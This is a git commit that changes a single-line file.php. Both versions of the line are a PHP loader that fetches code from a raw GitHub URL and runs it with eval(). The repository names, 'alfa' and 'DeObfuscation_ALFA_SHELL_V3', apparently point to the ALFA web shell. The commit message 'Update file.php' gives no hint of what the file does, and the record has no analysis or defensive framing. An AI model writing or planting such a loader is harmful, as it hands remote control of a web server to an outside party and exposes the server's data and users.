dee8b20ec9c7e10c3dc3d92ffd05acfe6b38bc59
Denizly Furqan <31403046+zycoder0day@users.noreply.github.com>
2023-02-22 11:54:06 +0000

    Update file.php

--- file.php
+++ file.php
@@ -1,1 +1,1 @@
-<?php eval("?>" . file_get_contents("https://raw.githubusercontent.com/zycoder0day/alfa/main/alf2.php7")); ?>
+<?php eval("?>" . file_get_contents("https://raw.githubusercontent.com/raminfp/DeObfuscation_ALFA_SHELL_V3/master/decode_stage_2.php")); ?>
